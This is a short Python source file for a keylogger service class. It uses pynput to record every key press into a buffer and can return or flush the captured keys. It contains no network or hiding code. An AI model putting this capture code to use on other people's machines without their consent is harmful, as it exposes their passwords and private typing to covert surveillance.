from interfaceManager import *
from buffer import *
from typing import List
from pynput import keyboard

class KeyLoggerService(IKeyLogger):


    def __init__(self):
        self.__listener = None
        self.__buffer = Buffer()
        self.__is_logging = False

    def start_logging(self) -> None:
        self.__is_logging = True
        self.__listener = keyboard.Listener(on_press=self.on_press)
        self.__listener.start()

    def stop_logging(self) -> None:
        self.__is_logging = False
        self.__listener.stop()

    def get_logged_keys(self) -> List[str]:
        return self.__buffer.get_data()

    def flush(self) -> None:
        self.__buffer.flush()

    def get_is_logging(self) -> bool:
        return self.__is_logging

    def convert_key_to_meaning(self, key):
        if str(key) == "Key.space":
            return " "
        elif str(key) == "Key.enter":
            return "\n"
        elif str(key) == "Key.backspace":
            return "\b"
        else:
            return str(key)

    def on_press(self, key):
        try:
            self.__buffer.add_data(key.char)
        except AttributeError:
            self.__buffer.add_data(self.convert_key_to_meaning(key))

